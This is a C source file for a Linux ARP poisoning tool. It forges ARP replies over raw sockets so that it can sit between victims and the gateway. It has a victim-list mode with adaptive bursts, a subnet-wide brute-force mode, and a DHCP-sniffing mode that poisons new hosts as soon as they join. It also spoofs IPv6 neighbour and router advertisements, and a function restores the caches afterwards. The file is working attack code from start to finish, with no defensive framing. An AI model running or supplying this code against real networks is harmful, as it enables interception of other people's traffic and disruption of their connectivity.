#include "arp_poison.h"
#include "arp_scan.h" // For struct arp_header definition
#include "ndp_block.h"
#include "utils_rate.h"
#include <arpa/inet.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <net/if.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <unistd.h>
#include "utils_discovery.h"

extern unsigned char *get_own_mac(void);

static struct Victim *g_poison_victims = NULL;
static int g_poison_victim_count = 0;
static unsigned char g_poison_gateway_ip[4];
static unsigned char g_poison_gateway_mac[6];
static unsigned char *g_poison_gateway_ipv6_ll = NULL;
static int g_poison_sockfd = -1;
static unsigned char *g_poison_my_mac = NULL;

// Sends a "burst" of packets to ensure we win the ARP race
void execute_poison_burst(void) {
  if (g_poison_sockfd == -1 || !g_poison_victims) return;
  
  printf("[BURST] Heartbeat detected! Sending G-ARP burst...\n");
  for (int b = 0; b < 3; b++) { // Burst of 3
    for (int i = 0; i < g_poison_victim_count; i++) {
      send_arp_reply(g_poison_sockfd, g_poison_victims[i].mac, g_poison_victims[i].ip, g_poison_my_mac, g_poison_gateway_ip);
      send_arp_reply(g_poison_sockfd, g_poison_gateway_mac, g_poison_gateway_ip, g_poison_my_mac, g_poison_victims[i].ip);
    }
    
    // Also burst IPv6 if available
    if (g_poison_gateway_ipv6_ll) {
      send_ndp_ra_block(g_poison_sockfd, g_poison_my_mac, g_poison_gateway_ipv6_ll);
      unsigned char all_nodes_mac[6] = {0x33, 0x33, 0x00, 0x00, 0x00, 0x01};
      send_ndp_na_spoof(g_poison_sockfd, all_nodes_mac, g_poison_my_mac, g_poison_gateway_ipv6_ll);
    }
    usleep(10000); // 10ms between rounds in the burst
  }
}

// Sends a single forged ARP reply
int send_arp_reply(int sockfd, unsigned char *target_mac,
                   unsigned char *target_ip, unsigned char *spoofed_mac,
                   unsigned char *spoofed_ip) {
  struct ifreq if_idx;
  struct sockaddr_ll socket_address;
  char ifName[IFNAMSIZ] = "eth0";

  // Prepare socket address
  memset(&socket_address, 0, sizeof(struct sockaddr_ll));
  strcpy(if_idx.ifr_name, ifName);
  if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0) {
    perror("SIOCGIFINDEX");
    return -1;
  }

  socket_address.sll_ifindex = if_idx.ifr_ifindex;
  socket_address.sll_halen = ETH_ALEN;
  memcpy(socket_address.sll_addr, target_mac, 6);

  int frame_length = sizeof(struct ethhdr) + 28; // 28 is standard ARP payload
  char *buffer = malloc(frame_length);
  if (!buffer)
    return -1;
  memset(buffer, 0, frame_length);

  // Build Ethernet header
  struct ethhdr *eth = (struct ethhdr *)buffer;
  memcpy(eth->h_source, spoofed_mac, 6);
  memcpy(eth->h_dest, target_mac, 6);
  eth->h_proto = htons(ETH_P_ARP);

  // Build standard ARP header overlaying the buffer space
  uint16_t *hw_type = (uint16_t *)(buffer + 14);
  uint16_t *proto_type = (uint16_t *)(buffer + 16);
  *hw_type = htons(1);
  *proto_type = htons(ETH_P_IP);
  buffer[18] = 6;
  buffer[19] = 4;

  uint16_t *opcode = (uint16_t *)(buffer + 20);
  *opcode = htons(2); // ARP Reply

  memcpy(buffer + 22, spoofed_mac, 6);
  memcpy(buffer + 28, spoofed_ip, 4);
  memcpy(buffer + 32, target_mac, 6);
  memcpy(buffer + 38, target_ip, 4);

  // Send packet
  if (sendto(sockfd, buffer, frame_length, 0,
             (struct sockaddr *)&socket_address,
             sizeof(struct sockaddr_ll)) < 0) {
    perror("sendto");
    free(buffer);
    return -1;
  }

  free(buffer);
  return 0;
}

// Subnet-Wide Brute Force loop
void start_wide_poisoning(unsigned char *gateway_ip, unsigned char *gateway_mac,
                          unsigned char *gateway_ipv6_ll) {
  printf("Starting Subnet-Wide ARP poisoning (BRUTE FORCE)...\n");
  int sockfd;
  if ((sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) == -1) {
    perror("socket");
    return;
  }

  unsigned char *my_mac = get_own_mac();
  unsigned char *my_ip = get_own_ip();
  unsigned char *netmask = get_netmask();

  if (!my_mac || !my_ip || !netmask) {
    fprintf(stderr, "Failed to get local network details for wide poisoning.\n");
    if (my_mac) free(my_mac);
    if (my_ip) free(my_ip);
    if (netmask) free(netmask);
    close(sockfd);
    return;
  }

  // Setup globals for burst (minimal usage here as we don't have a victim list)
  g_poison_sockfd = sockfd;
  g_poison_my_mac = my_mac;
  memcpy(g_poison_gateway_ip, gateway_ip, 4);
  memcpy(g_poison_gateway_mac, gateway_mac, 6);
  g_poison_gateway_ipv6_ll = gateway_ipv6_ll;

  uint32_t ip_int = ntohl(*(uint32_t *)my_ip);
  uint32_t mask_int = ntohl(*(uint32_t *)netmask);
  uint32_t net_int = ip_int & mask_int;
  uint32_t bcast_int = net_int | ~mask_int;

  unsigned char broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

  while (1) {
    // 1. Broadcast to everyone: "I am the Gateway"
    send_arp_reply(sockfd, broadcast_mac, (unsigned char *)&bcast_int, my_mac, gateway_ip);

    // 2. Tell Gateway: "Everyone in the subnet is at my MAC"
    for (uint32_t target = net_int + 1; target < bcast_int; target++) {
      uint32_t t_ip_h = htonl(target);
      if (memcmp(&t_ip_h, my_ip, 4) == 0 || memcmp(&t_ip_h, gateway_ip, 4) == 0)
        continue;

      send_arp_reply(sockfd, gateway_mac, gateway_ip, my_mac, (unsigned char *)&t_ip_h);
    }

    // 3. Block IPv6
    if (gateway_ipv6_ll) {
      send_ndp_ra_block(sockfd, my_mac, gateway_ipv6_ll);
      unsigned char all_nodes_mac[6] = {0x33, 0x33, 0x00, 0x00, 0x00, 0x01};
      send_ndp_na_spoof(sockfd, all_nodes_mac, my_mac, gateway_ipv6_ll);
    }

    printf("Wide-mode poison cycle complete. Sleeping 2s...\n");
    sleep(2);
  }

  free(my_mac);
  free(my_ip);
  free(netmask);
  close(sockfd);
}

// DHCP Sniffing (Smart Method) Implementation
void start_smart_poisoning(unsigned char *gateway_ip, unsigned char *gateway_mac,
                           unsigned char *gateway_ipv6_ll) {
  printf("Starting Event-Driven ARP poisoning (DHCP SNIFFER)...\n");
  int sockfd;
  // Listen for IP packets to capture DHCP
  if ((sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP))) == -1) {
    perror("socket");
    return;
  }

  unsigned char *my_mac = get_own_mac();
  if (!my_mac) {
    close(sockfd);
    return;
  }

  // We need a secondary socket for sending ARP replies (RAW ARP)
  int arp_sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
  if (arp_sockfd == -1) {
    perror("arp socket");
    free(my_mac);
    close(sockfd);
    return;
  }

  uint8_t buffer[2048];
  while (1) {
    int bytes = recv(sockfd, buffer, sizeof(buffer), 0);
    if (bytes < (int)(14 + 20 + 8 + 240)) continue; // Eth + IP + UDP + Min DHCP

    // Ethernet Header (14 bytes) -> IP Header (20 bytes) -> UDP Header (8 bytes)
    // UDP Source/Dest ports are at offset 14 + 20
    uint16_t src_port = ntohs(*(uint16_t *)(buffer + 34));
    uint16_t dst_port = ntohs(*(uint16_t *)(buffer + 36));

    // DHCP Server is usually port 67, Client 68
    if (dst_port == 68 || src_port == 67) {
      struct dhcp_packet *dhcp = (struct dhcp_packet *)(buffer + 14 + 20 + 8);
      
      // Look for DHCP ACK (Option 53 = 5) or DHCP REQUEST (Option 53 = 3)
      // Options start at offset 240 in BOOTP/DHCP
      uint8_t *opt = dhcp->options;
      int found_type = -1;
      
      // Simple scan for Option 53
      for (int i = 0; i < 308 - 2; i++) {
        if (opt[i] == 53 && opt[i+1] == 1) {
          found_type = opt[i+2];
          break;
        }
        if (opt[i] == 255) break;
      }

      if (found_type == 5 || found_type == 3) { // ACK or REQUEST
        unsigned char victim_ip[4];
        if (found_type == 5) {
          memcpy(victim_ip, &dhcp->yiaddr, 4);
        } else {
          // In Request, we usually look at Option 50 (Requested IP)
          for (int i = 0; i < 308 - 5; i++) {
             if (opt[i] == 50 && opt[i+1] == 4) {
               memcpy(victim_ip, &opt[i+2], 4);
               break;
             }
          }
        }

        if (victim_ip[0] != 0) {
          printf("[SMART] DHCP Event Detected! New Victim: %d.%d.%d.%d\n",
                 victim_ip[0], victim_ip[1], victim_ip[2], victim_ip[3]);
          
          // Trigger immediate poison burst
          for (int b = 0; b < 5; b++) {
            send_arp_reply(arp_sockfd, dhcp->chaddr, victim_ip, my_mac, gateway_ip);
            send_arp_reply(arp_sockfd, gateway_mac, gateway_ip, my_mac, victim_ip);
            usleep(10000);
          }
        }
      }
    }
  }

  free(my_mac);
  close(arp_sockfd);
  close(sockfd);
}

// Continuous poisoning loop
void start_poisoning(struct Victim *victims, int victim_count,
                     unsigned char *gateway_ip, unsigned char *gateway_mac,
                     unsigned char *gateway_ipv6_ll) {
  printf("Starting ARP poisoning loop for %d victims...\n", victim_count);
  int sockfd;
  if ((sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) == -1) {
    perror("socket");
    return;
  }

  unsigned char *my_mac = get_own_mac();
  if (!my_mac) {
    fprintf(stderr, "Failed to get own MAC for poisoning.\n");
    close(sockfd);
    return;
  }

  // Setup global state for burst callback
  g_poison_victims = victims;
  g_poison_victim_count = victim_count;
  memcpy(g_poison_gateway_ip, gateway_ip, 4);
  memcpy(g_poison_gateway_mac, gateway_mac, 6);
  g_poison_gateway_ipv6_ll = gateway_ipv6_ll;
  g_poison_sockfd = sockfd;
  g_poison_my_mac = my_mac;

  // Initialize Adaptive Rate Monitor and register burst callback
  set_burst_callback(execute_poison_burst);
  init_rate_monitor(gateway_mac, gateway_ip, gateway_ipv6_ll);

  while (1) {
    for (int i = 0; i < victim_count; i++) {
      // 1. Tell Victim: "I am the Gateway"
      send_arp_reply(sockfd, victims[i].mac, victims[i].ip, my_mac, gateway_ip);

      // 2. Tell Gateway: "I am the Victim"
      send_arp_reply(sockfd, gateway_mac, gateway_ip, my_mac, victims[i].ip);
    }

    // 3. Block IPv6 (NDP Spoofing)
    if (gateway_ipv6_ll) {
      send_ndp_ra_block(sockfd, my_mac, gateway_ipv6_ll);
      unsigned char all_nodes_mac[6] = {0x33, 0x33, 0x00, 0x00, 0x00, 0x01};
      send_ndp_na_spoof(sockfd, all_nodes_mac, my_mac, gateway_ipv6_ll);
    }

    float interval = get_adaptive_interval();
    printf("Poison packets sent. Sleeping %.1fs...\n", interval);
    usleep((useconds_t)(interval * 1000000));
  }

  free(my_mac);
  close(sockfd);
}

// Sends authentic ARP replies to restore caches
void heal_arp(struct Victim *victims, int victim_count,
              unsigned char *gateway_ip, unsigned char *gateway_mac) {
  printf("\n[HEALING] Restoring ARP caches for %d Victims and Gateway...\n",
         victim_count);
  int sockfd;
  if ((sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) == -1) {
    perror("socket");
    return;
  }

  // Send the authentic replies 3 times to ensure they are received
  for (int j = 0; j < 3; j++) {
    for (int i = 0; i < victim_count; i++) {
      // 1. Tell Victim: "The Gateway is really at the Gateway's MAC"
      send_arp_reply(sockfd, victims[i].mac, victims[i].ip, gateway_mac,
                     gateway_ip);

      // 2. Tell Gateway: "The Victim is really at the Victim's MAC"
      send_arp_reply(sockfd, gateway_mac, gateway_ip, victims[i].mac,
                     victims[i].ip);
    }
    // Sleep briefly to avoid flooding
    usleep(500000);
  }

  close(sockfd);
  printf("[HEALING] ARP Caches successfully restored.\n");
}
